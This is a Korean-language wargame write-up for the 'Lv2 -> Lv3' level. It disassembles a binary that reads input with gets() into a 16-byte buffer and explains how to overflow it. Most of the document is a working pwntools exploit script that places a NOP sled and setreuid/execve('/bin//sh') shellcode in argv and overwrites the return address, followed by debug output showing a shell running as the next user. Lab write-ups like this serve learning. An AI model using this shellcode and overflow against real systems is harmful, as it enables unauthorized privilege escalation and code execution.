# Lv2 -> Lv3
## lv3
gdb를 이용해 lv3 바이너리를 분석해 보면 다음과 같다.


* main
```asm
   0x080483f8 <+0>:	push   ebp		
   0x080483f9 <+1>:	mov    ebp,esp
   0x080483fb <+3>:	sub    esp,0x10			; buf : 0x10bytes
   0x080483fe <+6>:	lea    eax,[ebp-0x10]		; eax에 buf주소 복사
   0x08048401 <+9>:	push   eax			; eax값을 스택에 push
   0x08048402 <+10>:	call   0x804830c <gets@plt>	; gets(buf);
   0x08048407 <+15>:	add    esp,0x4
   0x0804840a <+18>:	lea    eax,[ebp-0x10]
   0x0804840d <+21>:	push   eax
   0x0804840e <+22>:	push   0x8048470
   0x08048413 <+27>:	call   0x804833c <printf@plt>
   0x08048418 <+32>:	add    esp,0x8
   0x0804841b <+35>:	leave  
   0x0804841c <+36>:	ret    
```

이번 문제는 gets를 이용해 BOF를 일으키는 문제다. 
buf의 크기는 0x10바이트이므로 더미값을 0x14개를 주고 argv에 NOP을 포함한 쉘코드를 넣어둔 후
argv[1]의 주소로 ret을 덮어 쓰면 된다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

argv = '\x90' * 500 + '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' 

p = process(['./lv3', argv])
p.sendline('a' * 16 + 'bbbb' + p32(0xffffd3dc))
p.sendline('id')
p.recv()
p.sendline('my-pass')
p.recv()
p.interactive()
```
------

```
lv2@ubuntu:~$ python exploit.py 
[+] Starting local process './lv3' argv=['./lv3', '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901\xc0\xb01\xcd\x80\x89\xc3\x89\xc11\xc0\xb0F\xcd\x801\xc0Ph//shh/bin\x89\xe3PS\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'] : pid 14956
[DEBUG] Sent 0x19 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  62 62 62 62  dc d3 ff ff  0a                        │bbbb│····│·│
    00000019
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x46 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  62 62 62 62  dc d3 ff ff  0a 75 69 64  3d 31 30 30  │bbbb│····│·uid│=100│
    00000020  33 28 6c 76  33 29 20 67  69 64 3d 31  30 30 32 28  │3(lv│3) g│id=1│002(│
    00000030  6c 76 32 29  20 67 72 6f  75 70 73 3d  31 30 30 32  │lv2)│ gro│ups=│1002│
    00000040  28 6c 76 32  29 0a                                  │(lv2│)·│
    00000046
[DEBUG] Sent 0x8 bytes:
    'my-pass\n'
[DEBUG] Received 0x12 bytes:
    'i dont like stdin\n'
[*] Switching to interactive mode
$  
```